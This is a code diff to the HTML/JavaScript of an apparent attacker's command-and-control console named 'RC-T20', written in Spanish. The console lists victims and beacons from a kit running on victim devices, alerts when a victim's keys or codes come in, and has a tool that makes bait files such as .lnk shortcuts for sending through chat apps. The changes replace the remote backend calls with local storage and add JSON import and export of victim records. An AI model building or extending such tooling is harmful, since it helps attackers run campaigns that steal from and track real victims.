@@ -215,6 +215,12 @@ footer .sep{color:#262b33}
   <!-- 01 OBJETIVOS -->
   <div class="view sel" id="v-tgts">
     <div class="sech"><div class="sq"></div><h2>REGISTRO DE OBJETIVOS</h2><span class="vac" id="btnVac">PURGAR TODO</span></div>
+    <div style="display:flex;gap:8px;align-items:center;margin:8px 0">
+      <span class="vac" id="btnExp">EXPORTAR JSON</span>
+      <span class="vac" id="btnImp">IMPORTAR JSON</span>
+      <input type="file" id="impFile" accept=".json,application/json" style="display:none">
+      <span id="lsSt" style="font-size:9px;color:var(--tx3);letter-spacing:1px;margin-left:auto"></span>
+    </div>
     <div id="tgtList"></div>
     <div class="panel" id="noTgt" style="text-align:center;color:var(--tx3);letter-spacing:2px;font-size:10px;padding:26px 10px">
       SIN OBJETIVOS EN LA LISTA<br><span style="font-size:9px;letter-spacing:1px">esperando beacon del kit en la víctima…</span>
@@ -388,7 +394,39 @@ const S = {
 };
 let AC = null;
 const $ = id => document.getElementById(id);
-const STATUS_URL = 'https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Status';
+const LS_KEY = 't20v22_registros';
+function localLoad() { try { return JSON.parse(localStorage.getItem(LS_KEY) || '[]'); } catch(e) { return []; } }
+function localSave(a) { try { localStorage.setItem(LS_KEY, JSON.stringify(a)); } catch(e) {} }
+function lsEstado() { const n = localLoad().length, el = $('lsSt'); if (el) el.textContent = n ? (n + ' REGISTROS LOCALES') : 'SIN REGISTROS LOCALES'; }
+function exportarJSON() {
+  const data = { version: 'RC-T20 vRC22', exportado: new Date().toISOString(), beacons: localLoad(), targets: S.targets };
+  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 't20-registros-' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-') + '.json';
+  a.click(); setTimeout(() => URL.revokeObjectURL(a.href), 4000);
+  logAdd('registros exportados: ' + localLoad().length + ' beacons', '');
+  lsEstado();
+}
+async function importarJSON(ev) {
+  const f = ev.target.files[0]; if (!f) return;
+  try {
+    const j = JSON.parse(await f.text());
+    const arr = Array.isArray(j) ? j : (j.beacons || []);
+    const cur = localLoad(); let n = 0;
+    for (const b of arr) {
+      if (!b || typeof b !== 'object') continue;
+      b.id = b.id || ('L' + Date.now().toString(36) + Math.random().toString(36).slice(2, 7));
+      b.created_date = b.created_date || new Date().toISOString();
+      cur.push(b); n++;
+    }
+    localSave(cur);
+    if (j && j.targets) for (const k in j.targets) if (!S.targets[k]) S.targets[k] = j.targets[k];
+    logAdd('importados ' + n + ' registros desde ' + f.name, '');
+  } catch(e) { logAdd('importacion fallida: ' + (e.message || e), 'err'); }
+  ev.target.value = '';
+  pollOnce(); lsEstado(); renderAll();
+}
 
 /* ===== AUDIO / NOTIF ===== */
 function beep(f, d) {
@@ -467,7 +505,7 @@ function ceboCrear() {
   $('ceboSt').textContent = '✓ listo — descarga';
   $('ceboRes').textContent = '✓ fabricado en tu dispositivo: ' + n + ' (' + mime + '). descargalo y envialo vos desde el chat que elijas — nadie más interviene.';
   $('ceboRes').style.color = '#f2d3d1';
-  fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Beacon', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ marker: 'H2-CEBO-FABRICADO', ua: 'consola-owner', extra: JSON.stringify({ nombre: n, tipo: '.' + ceboTipo, origen: 'local-dispositivo' }) }) }).catch(e => {});
+  logAdd('cebo fabricado localmente: ' + n + ' (' + mime + ')', '');
 }
 ceboExt('lnk');
 function scanLeds() {
@@ -886,32 +924,24 @@ wireSw('swNot', S.notifOn, v => { S.notifOn = v; localStorage.setItem('t20v8_not
 wireSw('swBeep', S.beepOn, v => { S.beepOn = v; localStorage.setItem('t20v8_beep', v?'1':'0'); });
 
 /* ===== PURGA ===== */
-async function vaciarTodo() {
-  if (!confirm('PURGAR: vaciar la lista y borrar todo el material del backend?')) return;
-  const allIds = [];
-  for (const uid in S.targets) (S.targets[uid].ids || []).forEach(id => allIds.push(id));
-  try {
-    await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20DelVictim', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: allIds }) });
-  } catch(e) {}
-  S.targets = {}; S.orphans = []; S.activeUid = null;
-  logAdd('LISTA PURGADA Y BACKEND VACIADO', 'err');
-  renderAll();
+function vaciarTodo() {
+  if (!confirm('PURGAR: vaciar la lista y borrar los registros locales?')) return;
+  localSave([]); S.targets = {}; S.orphans = []; S.activeUid = null; S.seen = new Set();
+  logAdd('LISTA PURGADA - ALMACENAMIENTO LOCAL VACIADO', 'err');
+  lsEstado(); renderAll();
 }
 $('btnVac').onclick = vaciarTodo;
-async function eliminarVictima(uid) {
+function eliminarVictima(uid) {
   const T = S.targets[uid];
   if (!T) return;
   if (!confirm('Eliminar objetivo y todo su material capturado?')) return;
-  try {
-    await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20DelVictim', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: T.ids || [] }) });
-  } catch(e) {}
-  (T.ids || []).forEach(id => S.seen.add(id));
+  const ids = T.ids || [];
+  localSave(localLoad().filter(b => !ids.includes(b.id)));
+  ids.forEach(id => S.seen.add(id));
   delete S.targets[uid];
   if (S.activeUid === uid) S.activeUid = null;
   logAdd('objetivo eliminado: ' + uid, 'warn');
-  renderAll();
+  lsEstado(); renderAll();
 }
 
 /* ===== PUSH NATIVO ===== */
@@ -927,30 +957,18 @@ function bufToB64(buf) { return btoa(String.fromCharCode.apply(null, new Uint8Ar
 async function enablePush() {
   const btn = $('btnPush'), st = $('pushSt');
   st.style.display = 'block';
-  if (!('serviceWorker' in navigator) || !('PushManager' in window)) { st.textContent = 'Este navegador no soporta notificaciones push.'; return; }
-  btn.textContent = '... PREPARANDO';
-  try {
-    const perm = await Notification.requestPermission();
-    if (perm !== 'granted') { st.textContent = 'Permiso de notificaciones denegado. Activalo en Ajustes del navegador.'; btn.textContent = 'ACTIVAR ALERTAS PUSH EN ESTE DISPOSITIVO'; return; }
-    const reg = await navigator.serviceWorker.register('sw.js');
-    await navigator.serviceWorker.ready;
-    let sub = await reg.pushManager.getSubscription();
-    if (!sub) sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlB64ToU8(PUSH_KEY) });
-    const r = await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20SavePush', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ endpoint: sub.endpoint, p256dh: bufToB64(sub.getKey('p256dh')), auth: bufToB64(sub.getKey('auth')), ua: navigator.userAgent.slice(0,200) })
-    });
-    const j = await r.json();
-    if (!j.ok) throw new Error(j.error || 'backend');
-    btn.textContent = 'ALERTAS ACTIVAS';
-    st.textContent = 'Listo. Notificación nativa al caer víctima, llave o código. Para que sea permanente: menú del Chrome → Añadir a pantalla principal.';
-    logAdd('alertas push activadas en este dispositivo', '');
-  } catch (e) {
-    btn.textContent = 'ACTIVAR ALERTAS PUSH EN ESTE DISPOSITIVO';
-    st.textContent = 'Error: ' + (e.message || e) + '. Probá de nuevo.';
-  }
+  if (!('Notification' in window)) { st.textContent = 'Este navegador no soporta notificaciones.'; btn.textContent = 'ALERTAS LOCALES'; return; }
+  const perm = await Notification.requestPermission();
+  if (perm !== 'granted') { st.textContent = 'Permiso de notificaciones denegado. Activalo en Ajustes del navegador.'; btn.textContent = 'ACTIVAR ALERTAS LOCALES'; return; }
+  S.notifOn = true; localStorage.setItem('t20v8_notif', '1');
+  btn.textContent = 'ALERTAS LOCALES ACTIVAS';
+  st.textContent = 'Listo: avisos nativos en este dispositivo mientras el panel este abierto. Sin servidor propio no hay push en segundo plano.';
+  logAdd('alertas locales activadas', '');
 }
 $('btnPush').addEventListener('click', enablePush);
+$('btnExp').onclick = exportarJSON;
+$('btnImp').onclick = () => $('impFile').click();
+$('impFile').onchange = importarJSON;
 
 /* ===== TABS ===== */
 function switchTab(v) {
@@ -961,28 +979,20 @@ document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', () =>
 
 /* ===== POLLING + ENLACE ===== */
 let linkFail = 0;
-async function poll() {
-  const t0 = Date.now();
-  try {
-    const r = await fetch(STATUS_URL);
-    const j = await r.json();
-    linkFail = 0;
-    $('ledLink').className = 'led on';
-    $('ftLink').textContent = 'OK ' + (Date.now() - t0) + 'ms';
-    $('ftSync').textContent = hhmmss();
-    let fresh = false;
-    for (const b of (j.beacons||[])) if (processBeacon(b)) fresh = true;
-    if (fresh) {
-      if (!S.activeUid && Object.keys(S.targets).length > 0) S.activeUid = Object.keys(S.targets)[0];
-      renderAll();
-    }
-  } catch(e) {
-    linkFail++;
-    $('ledLink').className = 'led err';
-    $('ftLink').textContent = 'FALLO x' + linkFail;
-    if (linkFail === 3) logAdd('ENLACE PERDIDO con el C2 — reintentando', 'err');
+function pollOnce() {
+  let fresh = false;
+  for (const b of localLoad()) if (processBeacon(b)) fresh = true;
+  if (fresh) {
+    if (!S.activeUid && Object.keys(S.targets).length > 0) S.activeUid = Object.keys(S.targets)[0];
+    renderAll();
   }
-  setTimeout(poll, 2500);
+}
+function poll() {
+  $('ledLink').className = 'led on';
+  $('ftLink').textContent = 'LOCAL';
+  $('ftSync').textContent = hhmmss();
+  try { pollOnce(); } catch(e) { $('ledLink').className = 'led err'; $('ftLink').textContent = 'LOCAL ERR'; }
+  setTimeout(poll, 1500);
 }
 setInterval(() => {
   const n = new Date();
@@ -992,7 +1002,8 @@ setInterval(() => {
 }, 1000);
 
 applyOp(localStorage.getItem('t20v8_op') || 't20');
-logAdd('RC-T20 vRC22 en línea · motor de clonación v13.4 · C2 enlazado', 'warn');
+logAdd('RC-T20 vRC22 en linea - motor de clonacion v13.4 - modo local (sin servidor)', 'warn');
+lsEstado();
 renderAll();
 poll();
 </script>
